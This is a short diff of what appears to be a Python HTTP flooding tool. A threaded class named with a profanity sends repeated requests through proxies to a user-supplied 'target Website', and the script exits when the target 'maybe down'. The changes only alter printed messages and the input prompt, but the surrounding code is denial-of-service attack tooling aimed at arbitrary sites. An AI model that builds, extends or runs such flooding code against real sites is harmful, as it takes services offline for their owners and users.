@@ -208,7 +208,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("==================Fucking the Website=================---> [%s]"%(self.url))
+        
         
         
             
@@ -220,7 +220,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("Connection Proxy Lost...exiting\n")
+                sys.stdout.write("Connection Proxy Lost or Target maybe down!!\n")
                 sys.exit(0)
         sys.exit(0)
 
@@ -252,7 +252,7 @@ class MainLoop():
     
     
     try:
-        url = input('Enter URL: ')
+        url = input('Enter target Website: ')
     except:
         url = input('Target Example:http://site.com: ')
     
